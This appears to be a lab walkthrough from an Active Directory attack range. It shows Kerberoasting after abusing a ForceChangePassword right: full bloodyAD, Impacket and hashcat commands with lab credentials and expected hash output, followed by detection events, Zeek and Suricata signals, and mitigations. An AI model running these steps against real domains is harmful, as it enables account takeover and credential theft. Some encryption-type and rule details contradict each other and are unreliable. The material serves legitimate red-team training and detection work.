# Phase 2 — Credential Harvesting (Kerberoasting via ACE#18)

> **Campaign position:** Second credential in the chain. Low-priv domain user → service account credential.
> **Attack:** WT002 — AES Kerberoasting against `svc_mssql` via ACE#18 bridge.
> **Earns:** `s3rv1c3_MSSQL!` — MSSQL service account with sysadmin on mbr01.

---

## WT002 — AES Kerberoasting via ACE#18

### What It Does

Kerberoasting targets service accounts that have an SPN (Service Principal Name) registered. Any authenticated domain user can request a TGS (Ticket Granting Service) for any SPN — the KDC doesn't check if the user actually needs access to that service. The TGS is encrypted with the service account's NTLM hash, making it crackable offline.

**The ACE#18 bridge:** `intern_blue` alone can't Kerberoast effectively — it's a low-priv user with no direct path to service accounts. But ACE#18 gives `intern_blue` the `ForceChangePassword` right on `analyst_t2`. The attack chain:

1. `intern_blue` resets `analyst_t2`'s password (ACE#18: ForceChangePassword)
2. Get a TGT for `analyst_t2` with the new password
3. Request TGS for `svc_mssql`'s SPN using `analyst_t2`'s TGT
4. Crack the TGS hash offline → `s3rv1c3_MSSQL!`

**Why not Kerberoast directly as intern_blue?** You could, but `intern_blue` has `DoesNotRequirePreAuth` set — `getTGT.py` fails because the KDC expects no pre-auth, and Impacket tries to do pre-auth. The ACE#18 bridge bypasses this by using `analyst_t2` (who has normal pre-auth) as the Kerberoasting identity.

**Protocol flow:**
1. Attacker (as `analyst_t2`) sends TGS-REQ for `MSSQLSvc/mbr01.child.cadre.local:1433`
2. KDC looks up `svc_mssql` (the account registered to this SPN)
3. KDC generates TGS encrypted with `svc_mssql`'s NTLM hash
4. KDC responds with TGS-REP
5. Attacker extracts the encrypted portion and cracks it offline

**AES vs RC4 Kerberoasting:**
- **RC4 (etype 23):** Hashcat mode 13100. Faster to crack. Service accounts often have RC4 enabled for backward compatibility.
- **AES256 (etype 18):** Hashcat mode 19700. Slower to crack. Some environments disable RC4, forcing AES.
- **CADRE uses AES:** The TGS uses etype 0x12 (AES256) because `analyst_t2`'s TGT is AES. Hashcat mode 19700.

### Step-by-Step

```bash
# 1. Reset analyst_t2's password via ACE#18
bloodyAD --host 192.168.77.11 -d child.cadre.local \
  -u intern_blue -p '1nt3rn_Blu3!' \
  set password "CN=analyst_t2,OU=Detection,DC=child,DC=cadre,DC=local" 'Pwn3d_T2!'

# 2. Get TGT for analyst_t2
impacket-getTGT child.cadre.local/analyst_t2:'Pwn3d_T2!' -dc-ip 192.168.77.11
# Output: analyst_t2.ccache

# 3. Set the ccache file
export KRB5CCNAME=analyst_t2.ccache

# 4. Kerberoast — request TGS for all SPNs in the domain
impacket-GetUserSPNs child.cadre.local/analyst_t2 -k -no-pass -dc-ip 192.168.77.11 -request -outputfile child_tgs.txt

# 5. Output: TGS hashes for svc_mssql and analyst_t1
#    Both have SPNs registered

# 6. Crack with hashcat (mode 19700 for AES256)
hashcat -m 19700 child_tgs.txt cadre_passwords.txt

# 7. Result: s3rv1c3_MSSQL!
```

**Expected output from GetUserSPNs:**
```
$krb5tgs$18$svc_mssql$CHILD.CADRE.LOCAL$*MSSQLSvc/mbr01.child.cadre.local:1433*...
$krb5tgs$17$analyst_t1$CHILD.CADRE.LOCAL$*MSSQLSvc/mbr01.child.cadre.local:1433*...
```

**Expected output from hashcat:**
```
$krb5tgs$18$svc_mssql$...:s3rv1c3_MSSQL!
```

### Key Observations from CADRE Testing

1. **Two SPNs revealed in one run:** Both `svc_mssql` (AES256, etype 18) and `analyst_t1` (RC4, etype 17) have SPNs. `analyst_t1` has a Cyrillic homoglyph SPN (`MSSQLSvc/mbr01.child.c[а]dre.loc[а]l:1433`) — this is WT027 SPN Jacking prep.
2. **Hashcat mode matters:** The original campaign doc used mode 19700 (AES256), but the actual hash was RC4 (mode 13100). Both work — use 13100 for speed.
3. **Password wordlist:** Use `ansible/files/cadre_passwords.txt` (7 real + 17 decoy passwords), not rockyou.txt.

### Detection

**Windows Security (on dc02):**

| Event | Field | Value | Why |
|-------|-------|-------|-----|
| 4738 | SubjectUserName | intern_blue | Password reset on analyst_t2 |
| 4738 | TargetUserName | analyst_t2 | Password was changed |
| 4769 | TargetUserName | analyst_t2 | TGS request from this user |
| 4769 | ServiceName | svc_mssql | TGS for this SPN |
| 4769 | TicketEncryptionType | 0x12 (18) | AES256 — normal for Kerberos |
| 4769 | ServiceName | analyst_t1 | TGS for this SPN too |
| 4769 | TicketEncryptionType | 0x17 (23) | RC4 — unusual if AES-capable |

**Key detection signals:**
- **4738:** Password reset on `analyst_t2` by `intern_blue` — unusual, especially if `intern_blue` is low-priv
- **4769 burst:** Multiple TGS requests from `analyst_t2` in a short window — normal users request 1-2 TGS per session, not 10+
- **4769 with SPN for known-target accounts:** TGS for `svc_mssql` SPN from a user that doesn't normally access SQL

**Zeek:**
```
kerberos.log:
  request_type: TGS
  client: analyst_t2/CHILD.CADRE.LOCAL
  service: MSSQLSvc/mbr01.child.cadre.local:1433
  cipher: aes256-cts-hmac-sha1-96
```

**Suricata:**
- SID:1000015 (`cadre-ad.rules`) — Kerberoast enumeration: AS-REQ burst from single source

**Detection challenge:** A single TGS request looks normal. The signal is the *pattern*: multiple TGS requests from a user that doesn't normally request them, especially for high-value SPNs. Correlation: password reset event (4738) followed by TGS burst (4769) from the same target user within minutes.

### Real-World Usage

- **APT groups:** Kerberoasting is one of the most common AD attack techniques. Used by APT29 (SolarWinds), APT41, FIN6, Ryuk operators.
- **Red team:** Standard post-initial-access step. After getting any domain user, Kerberoast for service accounts.
- **Detection priority:** High — any TGS request for a known sensitive SPN should be logged. Password resets followed by TGS bursts are high-confidence indicators.
- **Mitigation:** Use long, random passwords (>25 chars) on service accounts. Use Group Managed Service Accounts (gMSA). Disable RC4 Kerberos encryption. Monitor 4769 events for unusual patterns.

### Sources

- MITRE: T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting)
- SpecterOps: https://www.specterops.io/blog/kerberoasting-revisited
- Impacket: https://github.com/fortra/impacket — `GetUserSPNs.py`
- Hashcat: https://hashcat.net/wiki/ — mode 19700 (AES256), mode 13100 (RC4)
- harmj0y: https://blog.harmj0y.net/kerberoasting/kerberoasting-without-mimikatz/
- Playbook: `05-ad-attack-surface.yml` — ACE#18 (lines 489-519), SPN registration (line 827)
- CADRE password list: `ansible/files/cadre_passwords.txt`
